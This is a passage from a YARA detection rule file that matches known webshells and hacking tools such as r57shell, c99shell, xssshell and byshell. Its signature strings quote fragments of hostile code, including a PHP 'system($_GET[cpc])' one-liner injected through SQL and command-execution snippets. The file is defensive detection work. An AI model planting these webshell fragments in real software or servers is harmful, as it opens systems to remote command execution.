      tags = "DEMO, HKTL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s6 = "Can't uninstall,maybe the backdoor is not installed or,the Password you INPUT is" 
   condition: 
      all of them
} 

rule Webshell_r57shell_2_RID2E2D : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file r57shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:03:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "echo \"<br>\".ws(2).\"HDD Free : <b>\".view_size($free).\"</b> HDD Total : <b>\".view_" 
   condition: 
      all of them
} 

rule HKTL_Mithril_v1_45_dllTest_RID3085 : DEMO HKTL T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file dllTest.dll"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:43:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "syspath" 
      $s4 = "\\Mithril" 
      $s5 = "--list the services in the computer" 
   condition: 
      all of them
} 

rule HKTL_dbgiis6cli_RID2C83 : DEMO HKTL T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file dbgiis6cli.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 09:52:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" 
      $s5 = "###command:(NO more than 100 bytes!)" 
   condition: 
      all of them
} 

rule Webshell_remview_2003_04_22_RID304F : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file remview_2003_04_22.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:34:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\"<b>\".mm(\"Eval PHP code\").\"</b> (\".mm(\"don't type\").\" \\\"&lt;?\\\"" 
   condition: 
      all of them
} 

rule Webshell_FSO_s_test_RID2E7F : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file test.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:17:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$yazi = \"test\" . \"\\r\\n\";" 
      $s2 = "fwrite ($fp, \"$yazi\");" 
   condition: 
      all of them
} 

rule HKTL_Debug_cress_RID2D09 : DEMO HKTL T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file cress.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 10:14:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\\Mithril " 
      $s4 = "Mithril.exe" 
   condition: 
      all of them
} 

rule Webshell_RhV_webshell_RID2F6B : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file webshell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:56:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "RhViRYOzz" 
      $s1 = "d\\O!jWW" 
      $s2 = "bc!jWW" 
      $s3 = "0W[&{l" 
      $s4 = "[INhQ@\\" 
   condition: 
      all of them
} 

rule Webshell_thelast_index3_RID3045 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file index3.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:32:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s5 = "$err = \"<i>Your Name</i> Not Entered!</font></h2>Sorry, \\\"Your Name\\\" field is r" 
   condition: 
      all of them
} 

rule Webshell_HYTop_AppPack_2005_RID309F : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file 2005.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:47:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s6 = "\" onclick=\"this.form.sqlStr.value='e:\\hytop.mdb" 
   condition: 
      all of them
} 

rule Webshell_xssshell_RID2E1C : DEMO T1021 T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file xssshell.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:00:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1021, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "if( !getRequest(COMMANDS_URL + \"?v=\" + VICTIM + \"&r=\" + generateID(), \"pushComma" 
   condition: 
      all of them
} 

rule Webshell_FeliksPack3___PHP_Shells_usr_RID353E : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file usr.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 16:04:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<?php $id_info = array('notify' => 'off','sub' => 'aasd','s_name' => 'nurullahor" 
   condition: 
      all of them
} 

rule Webshell_FSO_s_phpinj_RID2F48 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file phpinj.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:50:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';" 
   condition: 
      all of them
} 

rule Webshell_xssshell_db_RID2F41 : DEMO T1021 T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file db.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:49:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1021, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s8 = "'// By Ferruh Mavituna | http://ferruh.mavituna.com" 
   condition: 
      all of them
} 

rule Webshell_PHP_sh_RID2CC8 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file sh.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 10:03:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\"@$SERVER_NAME \".exec(\"pwd\")" 
   condition: 
      all of them
} 

rule Webshell_xssshell_default_RID3160 : DEMO T1021 T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file default.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 13:19:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1021, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "If ProxyData <> \"\" Then ProxyData = Replace(ProxyData, DATA_SEPERATOR, \"<br />\")" 
   condition: 
      all of them
} 

rule HKTL_EditServer_2_RID2D31 : DEMO HKTL T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file EditServer.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 10:21:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "@HOTMAIL.COM" 
      $s1 = "Press Any Ke" 
      $s3 = "glish MenuZ" 
   condition: 
      all of them
} 

rule HKTL_by064cli_RID2B50 : DEMO HKTL T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file by064cli.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 09:01:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s7 = "packet dropped,redirecting" 
      $s9 = "input the password(the default one is 'by')" 
   condition: 
      all of them
} 

rule HKTL_Mithril_dllTest_RID2EB7 : DEMO HKTL T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file dllTest.dll"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:26:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "please enter the password:" 
      $s3 = "\\dllTest.pdb" 
   condition: 
      all of them
} 

rule Webshell_fmlibraryv3_RID2F17 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file fmlibraryv3.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:42:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "ExeNewRs.CommandText = \"UPDATE \" & tablename & \" SET \" & ExeNewRsValues & \" WHER" 
   condition: 
      all of them
} 

rule HKTL_Debug_dllTest_2_RID2E56 : DEMO HKTL T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file dllTest.dll"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:10:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "\\Debug\\dllTest.pdb" 
      $s5 = "--list the services in the computer" 
   condition: 
      all of them
} 

rule Webshell_connector_ASP_RID2FB4 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file connector.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:08:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "If ( AttackID = BROADCAST_ATTACK )" 
      $s4 = "Add UNIQUE ID for victims / zombies" 
   condition: 
      all of them
} 

rule HKTL_shelltools_g0t_root_HideRun_RID3387 : DEMO HKTL T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file HideRun.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 14:51:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Usage -- hiderun [AppName]" 
      $s7 = "PVAX SW, Alexey A. Popoff, Moscow, 1997." 
   condition: 
      all of them
} 

rule Webshell_PHP_Shell_v1_7_RID2F81 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file PHP_Shell_v1.7.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:00:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s8 = "<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]" 
   condition: 
      all of them
} 

rule Webshell_xssshell_save_RID302A : DEMO T1021 T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file save.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:28:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1021, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "RawCommand = Command & COMMAND_SEPERATOR & Param & COMMAND_SEPERATOR & AttackID" 
      $s5 = "VictimID = fm_NStr(Victims(i))" 
   condition: 
      all of them
} 

rule Webshell_FSO_s_phpinj_2_RID2FD9 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file phpinj.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:14:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s9 = "<? system(\\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 INTO" 
   condition: 
      all of them
} 

rule Webshell_FSO_s_ajan_RID2E59 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file ajan.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:10:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "entrika.write \"BinaryStream.SaveToFile" 
   condition: 
      all of them
} 

rule Webshell_c99shell_RID2D93 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file c99shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 10:37:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<br />Input&nbsp;URL:&nbsp;&lt;input&nbsp;name=\\\"uploadurl\\\"&nbsp;type=\\\"text\\\"&" 
   condition: 
      all of them
} 

rule Webshell_phpspy_2005_full_RID3082 : DEMO T1086 T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file phpspy_2005_full.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:42:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1086, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s7 = "echo \"  <td align=\\\"center\\\" nowrap valign=\\\"top\\\"><a href=\\\"?downfile=\".urlenco" 
   condition: 
      all of them
} 

rule Webshell_FSO_s_zehir4_2_RID2FA6 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file zehir4.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:06:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "\"Program Files\\Serv-u\\Serv" 
   condition: 
      all of them
} 

rule Webshell_FSO_s_indexer_2_RID303F : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file indexer.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:31:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s5 = "<td>Nerden :<td><input type=\"text\" name=\"nerden\" size=25 value=index.html></td>" 
   condition: 
      all of them
} 

rule Webshell_HYTop_DevPack_2005_RID309D : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file 2005.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:47:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s7 = "theHref=encodeForUrl(mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\")" 
      $s8 = "scrollbar-darkshadow-color:#9C9CD3;" 
      $s9 = "scrollbar-face-color:#E4E4F3;" 
   condition: 
      all of them
} 

rule HKTL_root_040_zip_Folder_deploy_RID32B3 : DEMO HKTL T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file deploy.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 14:16:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s5 = "halon synscan 127.0.0.1 1-65536" 
      $s8 = "Obviously you replace the ip address with that of the target." 
   condition: 
      all of them
} 

rule HKTL_by063cli_RID2B4F : DEMO HKTL T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file by063cli.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 09:01:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "#popmsghello,are you all right?" 
      $s4 = "connect failed,check your network and remote ip." 
   condition: 
      all of them
} 

rule HKTL_byshell063_ntboot_2_RID2FB5 : DEMO HKTL T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file ntboot.dll"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:08:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s6 = "OK,job was done,cuz we have localsystem & SE_DEBUG_NAME:)" 
   condition: 
      all of them
} 

rule HKTL_u_uay_RID2AC6 : DEMO HKTL T1050 T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file uay.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 08:21:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1050, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "exec \"c:\\WINDOWS\\System32\\freecell.exe" 
      $s9 = "SYSTEM\\CurrentControlSet\\Services\\uay.sys\\Security" 
   condition: 
      1 of them
} 

rule HKTL_pwreveal_RID2C09 : DEMO HKTL T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file pwreveal.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 09:32:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "*<Blank - no es" 
      $s3 = "JDiamondCS " 
      $s8 = "sword set> [Leith=0 bytes]" 
      $s9 = "ION\\System\\Floating-" 
   condition: 
      all of them
} 

rule HKTL_vanquish_2_RID2CA3 : DEMO HKTL T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file vanquish.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 09:57:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "Vanquish - DLL injection failed:" 
   condition: 
      all of them
} 

rule Webshell_down_rar_Folder_down_RID32D4 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file down.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 14:21:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "response.write \"<font color=blue size=2>NetBios Name: \\\\\"  & Snet.ComputerName &" 
   condition: 
      all of them
} 

rule Webshell_cmdShell_ASP_RID2F15 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file cmdShell.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:42:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "if cmdPath=\"wscriptShell\" then" 
   condition: 
      all of them
} 

rule HKTL_portlessinst_RID2DDD : DEMO HKTL T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file portlessinst.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 10:50:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "Fail To Open Registry" 
      $s3 = "f<-WLEggDr\"" 
      $s6 = "oMemoryCreateP" 
   condition: 
      all of them
} 

rule HKTL_SetupBDoor_RID2C8A : DEMO HKTL T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file SetupBDoor.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 09:53:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\BDoor\\SetupBDoor" 
   condition: 
      all of them
} 

rule Webshell_phpshell_3_RID2E98 : DEMO T1086 T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file phpshell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:21:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1086, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p>" 
      $s5 = "      echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>\\n\";" 
   condition: 
      all of them
} 

rule HKTL_BIN_Server_RID2C52 : DEMO HKTL T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file Server.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 09:44:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "configserver" 
      $s1 = "GetLogicalDrives" 
      $s2 = "WinExec" 
      $s4 = "fxftest" 
      $s5 = "upfileok" 
      $s7 = "upfileer" 
   condition: 
      all of them
} 

rule Webshell_HYTop2006_rar_Folder_2006_RID32C8 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file 2006.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 14:19:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s6 = "strBackDoor = strBackDoor " 
   condition: 
      all of them
} 

rule Webshell_r57shell_3_RID2E2E : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file r57shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:03:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<b>\".$_POST['cmd']" 
   condition: 
      all of them
} 

rule Webshell_FSO_s_ajan_2_RID2EEA : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file ajan.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:34:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "\"Set WshShell = CreateObject(\"\"WScript.Shell\"\")" 
      $s3 = "/file.zip" 
   condition: 
      all of them
} 

rule Simple_PHP_BackDooR_RID2E06 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file Simple_PHP_BackDooR_RID2E06.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 10:56:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<hr>to browse go to http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=[directory he" 
      $s6 = "if(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], $dir.$fn" 
      $s9 = "// a simple php backdoor" 
   condition: 
      1 of them
} 

rule Webshell_HYTop_DevPack_2005Red_RID31B8 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file 2005Red.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 13:34:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "scrollbar-darkshadow-color:#FF9DBB;" 
      $s3 = "echo \"&nbsp;<a href=\"\"/\"&encodeForUrl(theHref,false)&\"\"\" target=_blank>\"&replace" 
      $s9 = "theHref=mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\"),2)" 
   condition: 
      all of them
} 

rule HKTL_HYTop_CaseSwitch_2005_RID2FEA : DEMO HKTL T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file 2005.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:17:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "MSComDlg.CommonDialog" 
      $s2 = "CommonDialog1" 
      $s3 = "__vbaExceptHandler" 
      $s4 = "EVENT_SINK_Release" 
      $s5 = "EVENT_SINK_AddRef" 
      $s6 = "By Marcos" 
      $s7 = "EVENT_SINK_QueryInterface" 
      $s8 = "MethCallEngine" 
   condition: 
      all of them
} 

rule Webshell_FSO_s_RemExp_RID2F10 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file RemExp.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:41:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=SubFolder.Name%>\"> <a href= \"<%=Request.Ser" 
      $s5 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f=<%=F" 
      $s6 = "<td bgcolor=\"<%=BgColor%>\" align=\"right\"><%=Attributes(SubFolder.Attributes)%></" 
   condition: 
      all of them
} 

rule Webshell_FeliksPack3___PHP_Shells_2005_RID34AB : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file 2005.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 15:40:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
